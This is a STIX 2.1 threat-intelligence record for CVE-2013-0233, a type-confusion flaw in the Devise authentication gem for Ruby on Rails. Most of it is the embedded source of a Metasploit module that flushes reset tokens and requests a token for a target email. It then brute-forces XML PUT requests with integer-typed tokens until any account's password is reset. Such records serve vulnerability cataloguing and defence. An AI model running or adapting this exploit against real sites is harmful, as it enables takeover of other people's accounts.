{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--8887fdc5-7910-4a8f-b703-e4ecaacf583f",
    "created": "2024-08-14T16:23:29.320958Z",
    "modified": "2024-08-14T16:23:29.320962Z",
    "name": "Ruby on Rails Devise Authentication Password Reset",
    "description": " The Devise authentication gem for Ruby on Rails is vulnerable to a password reset exploit leveraging type confusion.  By submitting XML to rails, we can influence the type used for the reset_password_token parameter.  This allows for resetting passwords of arbitrary accounts knowing only the associated email address.  This module defaults to the most common devise URIs and response values but these may require adjustment for implementations which customize them.  Affects Devise < v2.2.3, 2.1.3, 2.0.5 and 1.5.4 when backed by any database except PostgreSQL or SQLite3. Tested with v2.2.2, 2.1.2, and 2.0.4 on Rails 3.2.11. Patch applied to Rails 3.2.12 and 3.1.11 should prevent exploitation of this vulnerability, by quoting numeric values when comparing them with non numeric values. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/http/rails_devise_pass_reset.rb",
            "external_id": "rails_devise_pass_reset.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-0233"
        },
        {
            "source_name": "reference",
            "url": "http://blog.plataformatec.com.br/2013/01/security-announcement-devise-v2-2-3-v2-1-3-v2-0-5-and-v1-5-3-released/"
        },
        {
            "source_name": "reference",
            "url": "http://www.phenoelit.org/blog/archives/2013/02/05/mysql_madness_and_rails/index.html"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/rails/rails/commit/921a296a3390192a71abeec6d9a035cc6d1865c8"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/rails/rails/commit/26e13c3ca71cbc7859cc4c51e64f3981865985d8"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'rexml/element'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Ruby on Rails Devise Authentication Password Reset',\n        'Description' => %q{\n          The Devise authentication gem for Ruby on Rails is vulnerable\n          to a password reset exploit leveraging type confusion.  By submitting XML\n          to rails, we can influence the type used for the reset_password_token\n          parameter.  This allows for resetting passwords of arbitrary accounts,\n          knowing only the associated email address.\n\n          This module defaults to the most common devise URIs and response values,\n          but these may require adjustment for implementations which customize them.\n\n          Affects Devise < v2.2.3, 2.1.3, 2.0.5 and 1.5.4 when backed by any database\n          except PostgreSQL or SQLite3. Tested with v2.2.2, 2.1.2, and 2.0.4 on Rails\n          3.2.11. Patch applied to Rails 3.2.12 and 3.1.11 should prevent exploitation\n          of this vulnerability, by quoting numeric values when comparing them with\n          non numeric values.\n        },\n        'Author' => [\n          'joernchen', # original discovery and disclosure\n          'jjarmoc' # metasploit module\n        ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          [ 'CVE', '2013-0233'],\n          [ 'OSVDB', '89642' ],\n          [ 'BID', '57577' ],\n          [ 'URL', 'http://blog.plataformatec.com.br/2013/01/security-announcement-devise-v2-2-3-v2-1-3-v2-0-5-and-v1-5-3-released/'],\n          [ 'URL', 'http://www.phenoelit.org/blog/archives/2013/02/05/mysql_madness_and_rails/index.html'],\n          [ 'URL', 'https://github.com/rails/rails/commit/921a296a3390192a71abeec6d9a035cc6d1865c8' ],\n          [ 'URL', 'https://github.com/rails/rails/commit/26e13c3ca71cbc7859cc4c51e64f3981865985d8']\n        ],\n        'DisclosureDate' => '2013-01-28'\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [ true, 'The request URI', '/users/password']),\n        OptString.new('TARGETEMAIL', [true, 'The email address of target account']),\n        OptString.new('OBJECTNAME', [true, 'The user object name', 'user']),\n        OptString.new('PASSWORD', [true, 'The password to set']),\n        OptBool.new('FLUSHTOKENS', [ true, 'Flush existing reset tokens before trying', true]),\n        OptInt.new('MAXINT', [true, 'Max integer to try (tokens beginning with a higher int will fail)', 10])\n      ]\n    )\n  end\n\n  def generate_token(account)\n    # CSRF token from GET \"/users/password/new\" isn't actually validated it seems.\n\n    postdata = \"#{datastore['OBJECTNAME']}[email]=#{account}\"\n\n    res = send_request_cgi({\n      'uri' => normalize_uri(datastore['TARGETURI']),\n      'method' => 'POST',\n      'data' => postdata\n    })\n\n    unless res\n      print_error('No response from server')\n      return false\n    end\n\n    if res.code == 200\n      error_text = res.body[%r{<div id=\"error_explanation\">\\n\\s+(.*?)</div>}m, 1]\n      print_error('Server returned error')\n      vprint_error(error_text)\n      return false\n    end\n\n    return true\n  end\n\n  def clear_tokens\n    count = 0\n    status = true\n    until (status == false)\n      status = reset_one(Rex::Text.rand_text_alpha(rand(5..14)))\n      count += 1 if status\n    end\n    vprint_status(\"Cleared #{count} tokens\")\n  end\n\n  def reset_one(password, report = false)\n    (0..datastore['MAXINT']).each do |int_to_try|\n      encode_pass = REXML::Text.new(password).to_s\n\n      xml = ''\n      xml << \"<#{datastore['OBJECTNAME']}>\"\n      xml << \"<password>#{encode_pass}</password>\"\n      xml << \"<password_confirmation>#{encode_pass}</password_confirmation>\"\n      xml << \"<reset_password_token type=\\\"integer\\\">#{int_to_try}</reset_password_token>\"\n      xml << \"</#{datastore['OBJECTNAME']}>\"\n\n      res = send_request_cgi({\n        'uri' => normalize_uri(datastore['TARGETURI']),\n        'method' => 'PUT',\n        'ctype' => 'application/xml',\n        'data' => xml\n      })\n\n      unless res\n        print_error('No response from server')\n        return false\n      end\n\n      case res.code\n      when 200\n        # Failure, grab the error text\n        # May need to tweak this for some apps...\n        error_text = res.body[%r{<div id=\"error_explanation\">\\n\\s+(.*?)</div>}m, 1]\n        if report && (error_text !~ /token/)\n          print_error('Server returned error')\n          vprint_error(error_text)\n          return false\n        end\n      when 302\n        # Success!\n        return true\n      else\n        print_error(\"ERROR: received code #{res.code}\")\n        return false\n      end\n    end\n\n    print_error(\"No active reset tokens below #{datastore['MAXINT']} remain. Try a higher MAXINT.\") if report\n    return false\n  end\n\n  def run\n    # Clear outstanding reset tokens, helps ensure we hit the intended account.\n    if datastore['FLUSHTOKENS']\n      print_status('Clearing existing tokens...')\n      clear_tokens\n    end\n    # Generate a token for our account\n    print_status(\"Generating reset token for #{datastore['TARGETEMAIL']}...\")\n    status = generate_token(datastore['TARGETEMAIL'])\n    if status == false\n      print_error('Failed to generate reset token')\n      return\n    end\n    print_good('Reset token generated successfully')\n\n    # Reset a password.  We're racing users creating other reset tokens.\n    # If we didn't flush, we'll reset the account with the lowest ID that has a token.\n    print_status(\"Resetting password to \\\"#{datastore['PASSWORD']}\\\"...\")\n    status = reset_one(datastore['PASSWORD'], true)\n    status ? print_good('Password reset worked successfully') : print_error('Failed to reset password')\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-01-28"
}